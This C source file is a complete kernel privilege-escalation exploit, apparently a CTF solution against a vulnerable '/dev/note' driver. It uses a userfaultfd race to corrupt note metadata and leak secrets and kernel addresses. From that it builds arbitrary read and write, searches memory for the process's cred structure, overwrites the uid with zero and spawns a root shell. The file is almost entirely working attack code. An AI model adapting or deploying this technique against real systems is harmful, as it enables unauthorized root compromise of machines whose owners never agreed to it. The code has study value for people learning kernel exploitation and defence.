#define _GNU_SOURCE
#include<sys/types.h>
#include<stdio.h>
#include<linux/userfaultfd.h>
#include<pthread.h>
#include<errno.h>
#include<stdlib.h>
#include<fcntl.h>
#include<signal.h>
#include<string.h>
#include<sys/mman.h>
#include<sys/syscall.h>
#include<poll.h>
#include<unistd.h>
#include<string.h>
#include<sys/ioctl.h>
#include<sys/prctl.h>

#define ulong unsigned long
#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
                        } while (0)

ulong user_cs,user_ss,user_sp,user_rflags;
int fd;                     // file descriptor of /dev/note

void pop_shell(void)
{
  char *argv[] = {"/bin/sh",NULL};
  char *envp[] = {NULL};
  execve("/bin/sh",argv,envp);
}

static void save_state(void) {
  asm(
      "movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "movq %%rsp, %2\n"
      "pushfq\n"
      "popq %3\n"
      : "=r" (user_cs), "=r" (user_ss), "=r"(user_sp), "=r" (user_rflags) : : "memory" 		);
}

#define CREATE 0xffffff00
#define EDIT   0xffffff01
#define READ   0xffffff02
#define ALLDEL 0xffffff03

struct info{
  unsigned long idx;
  unsigned long size;
  char *buf;
};

int _create(char *buf, unsigned long size)
{
  struct info info;
  info.buf = buf;
  info.size = size;
  info.idx = 0;
  if(ioctl(fd,CREATE,&info) < 0)
    errExit("_create");
  puts("[+] created new note");
}

int _alldel(void)
{
  struct info info;
  info.buf = NULL;
  info.size = 0;
  info.idx = 0;
  if(ioctl(fd,ALLDEL,&info) < 0)
    errExit("_delall");
  puts("[+] all deleted");
}

int _read(unsigned long idx,char *buf)
{
  struct info info;
  info.buf = buf;
  info.size = 0;
  info.idx = idx;
  if(ioctl(fd,READ,&info) < 0)
    errExit("_read");
  //printf("[+] read note: %d\n",idx);
}

int _edit(unsigned long idx, char *buf)
{
  struct info info;
  info.buf = buf;
  info.size = 0;
  info.idx = idx;
  if(ioctl(fd,EDIT,&info) < 0)
    errExit("_edit");
  //printf("[+] edited: %d\n",idx);
}

char *addr = 0x117117000;    // memory region supervisored
char buf[0x3000];            // userland buffer
unsigned long len = 0x1000;  // memory length

// cf. man page of userfaultfd
static void* fault_handler_thread(void *arg)
{
  puts("[+] entered fault_handler_thread");

  static struct uffd_msg msg;   // data read from userfaultfd
  struct uffdio_copy uffdio_copy;
  long uffd = (long)arg;        // userfaultfd file descriptor
  struct pollfd pollfd;         //
  int nready;                   // number of polled events

  // set poll information
  pollfd.fd = uffd;
  pollfd.events = POLLIN;

  // wait for poll
  puts("[+] polling...");
  while(poll(&pollfd, 1, -1) > 0){
    if(pollfd.revents & POLLERR || pollfd.revents & POLLHUP)
      errExit("poll");

    // read an event
    if(read(uffd, &msg, sizeof(msg)) == 0)
      errExit("read");

    if(msg.event != UFFD_EVENT_PAGEFAULT)
      errExit("unexpected pagefault");

    printf("[!] page fault: %p\n",msg.arg.pagefault.address);

    // Now, another thread is halting. Do my business.
    puts("[+] now alldel + create*2");
    _alldel();                    // delete all notes
    _create(buf,0x10);            // create note idx:0
    _create(buf,0x10);            // creat enote idx:1


    // forge user buffer passed into copy_from_user(), which doesn't take a lock cuz called in unlock_ioctl
    uffdio_copy.src = buf;
    uffdio_copy.dst = addr;
    uffdio_copy.len = len;
    uffdio_copy.mode = 0;
    if(ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
      errExit("ioctl-UFFDIO_COPY");

    break;
  }

  puts("[+] exiting fault_handler_thrd");
}

// cf. man page of userfaultfd
void register_userfaultfd_and_halt(void)
{
  puts("[+] registering userfaultfd...");

  long uffd;      // userfaultfd file descriptor
  pthread_t thr;  // ID of thread that handles page fault and continue exploit in another kernel thread
  struct uffdio_api uffdio_api;
  struct uffdio_register uffdio_register;
  int s;

  // create userfaultfd file descriptor
  uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK); // there is no wrapper in libc
  if(uffd == -1)
    errExit("userfaultfd");

  // enable uffd object via ioctl(UFFDIO_API)
  uffdio_api.api = UFFD_API;
  uffdio_api.features = 0;
  if(ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
    errExit("ioctl-UFFDIO_API");

  // mmap
  puts("[+] mmapping...");
  addr = mmap(addr, len, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0); // set MAP_FIXED for memory to be mmaped on exactly specified addr.
  puts("[+] mmapped...");
  if(addr == MAP_FAILED)
    errExit("mmap");

  // specify memory region handled by userfaultfd via ioctl(UFFDIO_REGISTER)
  uffdio_register.range.start = addr;
  uffdio_register.range.len = len;
  uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
  if(ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
    errExit("ioctl-UFFDIO_REGISTER");

  s = pthread_create(&thr, NULL, fault_handler_thread, (void*)uffd);
  if(s!=0){
    errno = s;
    errExit("pthread_create");
  }

  puts("[+] registered userfaultfd");
}


int main(void)
{
  unsigned long secret;
  unsigned long content_ptr;
  unsigned long modulebase;
  unsigned long dif_main_buf, dif_notes_array;
  unsigned long page_offset_base;
  unsigned long rip_call_copy_to_user;
  unsigned long addr_copy_to_user;
  signed long rel_jmp_offset;
  unsigned long kern_textbase;
  void *tmp_addr;
  unsigned char *addr_cred;
  unsigned long addr_cred_in_task_struct;
  char tmp_buf[0x100];

  unsigned long diff_copy_to_user = 0x353ee0;

  memset(buf, 0x00, sizeof(buf));

  // open miscdevice
  //if((fd=open("/dev/note",O_RDWR))<0) // O_RDWR would be rejected due to permission error
  if((fd=open("/dev/note",O_RDONLY))<0)
    errExit("open-/dev/note");

  // leak secret
  buf[0x10+0x8] = 0xff;     // overwrite note1's size, which is allocated later
  _create(buf, 0x19);
  register_userfaultfd_and_halt();
  sleep(1);
  _edit(0, addr);           // invoke page fault and call fault_handler
  _read(1, buf);

  printf("[+] buf addr: %p\n",buf);
  printf("[!] head of leaked data:\n");
  for(int ix=0; ix!=0x8; ++ix){
    printf("\t%llx\n", ((unsigned long*)buf)[ix]);
  }
  secret = (void*)((unsigned long*)buf)[0x2];
  printf("[!] secret: %p\n", secret);

  // leak content_ptr
  memset(buf, 0x00, sizeof(buf));
  _create(buf, 0x10);       // idx:2
  _read(1, buf);
  printf("[!] leaked data decrypted with secret: %llx:\n",secret);
  for(int ix=0;ix!=0x10; ++ix){
    printf("\t%llx\n", ((unsigned long*)buf)[ix] ^ secret);
  }
  content_ptr = ((unsigned long*)buf)[4] ^ secret;
  printf("[!] content_ptr of note2: %p\n",(void*)content_ptr);
  dif_main_buf = content_ptr - 0x68;    // main_buf - page_offset_base
  dif_notes_array = dif_main_buf + (0x102b60 - 0x100b60); // notes_array - page_offset_base
  printf("[!] dif_notes_array: %p\n",(void*)dif_notes_array);

  // leak modulebase & page_offset_base
  ((unsigned long*)buf)[0] = 0;   // content of note1
  ((unsigned long*)buf)[1] = 0;   // content of note1
  ((unsigned long*)buf)[2] = 0;   // secret of note2
  ((unsigned long*)buf)[3] = 8;   // size of note2
  ((unsigned long*)buf)[4] = dif_notes_array;   // content_ptr of note2
  for(int ix=0; ix!=5; ++ix){     // encrypt
    ((unsigned long*)buf)[ix] = ((unsigned long*)buf)[ix] ^ secret;
  }
  _edit(1, buf);                  // overwrite note2's content_ptr into notes_array
  _read(2, buf);                  // read &note0
  printf("[!] leaked data decrypted with secret: 0x00:\n");
  for(int ix=0;ix!=0x8; ++ix){
    printf("\t%llx\n", ((unsigned long*)buf)[ix]); // notes are no more encrypted
  }
  modulebase = (((unsigned long*)buf)[0]) - 0x2520;
  page_offset_base = (((unsigned long*)buf)[0]) + 0x68 - content_ptr;
  printf("[!] modulebase: %p\n",(void*)modulebase);
  printf("[!] page_offset_base: %p\n",(void*)page_offset_base);

  /* now we have AAW/AAR, not limited to relative one */

  // read instruction
  rip_call_copy_to_user = modulebase + 0x1cc;
  ((unsigned long*)buf)[0] = 0;   // content of note1
  ((unsigned long*)buf)[1] = 0;   // content of note1
  ((unsigned long*)buf)[2] = 0;   // secret of note2
  ((unsigned long*)buf)[3] = 8;   // size of note2
  ((unsigned long*)buf)[4] = rip_call_copy_to_user - page_offset_base;  // content_ptr of note2
  for(int ix=0; ix!=5; ++ix){     // encrypt
    ((unsigned long*)buf)[ix] = ((unsigned long*)buf)[ix] ^ secret;
  }
  _edit(1, buf);                  // overwrite note2's content_ptr into notes_array
  _read(2, buf);                  // read instruction
  printf("[!] instruction call copy_to_user():\n\t");
  for(int ix=0; ix!=5; ++ix){
    printf("%02x ", *(unsigned char*)(buf + ix));
  }
  printf("\n");

  // calc addr of call_to_user and kern_textbase
  addr_copy_to_user = rip_call_copy_to_user;
  rel_jmp_offset = 0;
  for(int ix=0; ix!=4; ++ix){
    //addr_copy_to_user += (unsigned long)(*(unsigned char*)(buf + ix + 1)) << (8*ix + 32);
    rel_jmp_offset += (unsigned long)(*(unsigned char*)(buf + ix + 1)) << (8*ix);
  }
  addr_copy_to_user = (signed int)rel_jmp_offset + addr_copy_to_user + 5; // relational jmp uses RIP for "next" instruction's addr, so add len(call copy_to_user)
  printf("[!] copy_to_user: %p\n",(void*)addr_copy_to_user);
  kern_textbase = addr_copy_to_user - diff_copy_to_user;
  printf("[!] kern_textbase: %p\n",(void*)kern_textbase);

  /* task_struct はデバッグオプションによって中身がかなり変わるため、+0x7e8がどのメンバが突き止めるのはムリ */

  /* struct task_struct 中の char comm[0x10] という、executable nameを格納するメンバがある
  prctl(PR_SET_NAME) によってこの current->comm を変更することができる */
  if(prctl(PR_SET_NAME, "FuckThisSummer") == -1) // change current->comm into "FuckThisSummer"
    errExit("prctl");
  for(unsigned long ix=0; 1==1; ix+=0x50){
    tmp_addr = page_offset_base + ix;     // target of search
    if(ix%0x100000*2==0)
      printf("[.] searching %llx ...\n", tmp_addr);
    memset(buf, 0x00, 0x100);
    ((unsigned long*)buf)[0] = 0;   // content of note1
    ((unsigned long*)buf)[1] = 0;   // content of note1
    ((unsigned long*)buf)[2] = 0;   // secret of note2
    ((unsigned long*)buf)[3] = 0xff;   // size of note2
    ((unsigned long*)buf)[4] = tmp_addr - page_offset_base;  // content_ptr of note2
    for(int ix=0; ix!=5; ++ix){     // encrypt
      ((unsigned long*)buf)[ix] = ((unsigned long*)buf)[ix] ^ secret;
    }
    _edit(1, buf);
    _read(2, buf);

    tmp_addr = memmem(buf, 0x100, "FuckThisSummer", sizeof("FuckThisSummer"));
    if(tmp_addr != NULL){
      addr_cred = *(unsigned long*)((unsigned long)tmp_addr - 8);
      tmp_addr = page_offset_base + ix + (buf - (unsigned long)tmp_addr);
      printf("\n[!!] FOUND current_task.comm: %p\n",(void*)tmp_addr);
      printf("\n[!!] FOUND cred: %p\n",(void*)addr_cred);
      break;
    }
  }

  // いくらデバッグオプションでメンバが違うと言っても、credとcommは隣り合っているから大丈夫
  // leak cred
  // overwrite content_ptr of note2 into cred
  memset(tmp_buf, 0x00, 0x100);
  ((unsigned long*)tmp_buf)[0] = 0;   // content of note1
  ((unsigned long*)tmp_buf)[1] = 0;   // content of note1
  ((unsigned long*)tmp_buf)[2] = 0;   // secret of note2
  ((unsigned long*)tmp_buf)[3] = 0x20;   // size of note2
  ((unsigned long*)tmp_buf)[4] = addr_cred + 4 - page_offset_base;  // +4 is to avoid atomic_t usage
  for(int ix=0; ix!=5; ++ix){     // encrypt
    ((unsigned long*)tmp_buf)[ix] = ((unsigned long*)tmp_buf)[ix] ^ secret;
  }
  _edit(1, tmp_buf);

  // Overwrite current->cred->uid into zero
  puts("[+] overwrite current->uid");
  memset(buf, 0x00, 0x100);
  _edit(2, buf);

  // pop shell and happy birthday!
  puts("[!!!] popping shell...\n");
  pop_shell();

  return 0;
}
